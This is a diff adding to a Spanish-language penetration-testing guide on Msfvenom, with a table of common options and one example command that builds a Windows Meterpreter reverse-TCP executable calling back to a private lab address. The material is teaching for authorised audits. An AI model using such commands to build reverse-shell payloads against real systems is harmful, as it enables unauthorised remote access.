@@ -81,6 +81,30 @@ Permite generar payloads compatibles con sistemas Windows, Linux, macOS y Androi
 
 Con `Msfvenom` se pueden payloads que, una vez ejecutados en el sistema objetivo, establecen una comunicación con un listener o handler configurado previamente por el auditor. Esta conexión permite gestionar la sesión obtenida y evaluar el nivel de acceso alcanzado durante la prueba.
 
+Algunas de las opciones más usadas son:
+
+| Opción           | Descripción                                                       |
+| ---------------- | ----------------------------------------------------------------- |
+| `-p`             | Selecciona el payload que se va a generar.                        |
+| `-l payloads`    | Lista los payloads disponibles.                                   |
+| `-l formats`     | Lista los formatos de salida disponibles.                         |
+| `-f`             | Especifica el formato de salida (exe, elf, raw, python, c, etc.). |
+| `-o`             | Guarda la salida en un archivo.                                   |
+| `--list-options` | Muestra las opciones requeridas por un payload concreto.          |
+| `-a`             | Arquitectura objetivo (x86, x64, etc.).                           |
+| `--platform`     | Plataforma objetivo (Windows, Linux, Android, etc.).              |
+| `-e`             | Aplica un encoder al payload.                                     |
+| `-i`             | Número de iteraciones del encoder.                                |
+| `-b`             | Especifica bytes que deben evitarse (*bad characters*).           |
+| `-s`             | Tamaño máximo permitido para el payload.                          |
+| `-n`             | Añade datos extra (*NOP sled* o espacio adicional).               |
+
+Ejemplo:
+
+```bash
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.1.45 LPORT=1234 -o payload.exe
+```
+
 ## 4.2. Codificación  de payloads con `Msfvenom`
 
 ## 4.3. Inyección de payloads en ejecutables Windows
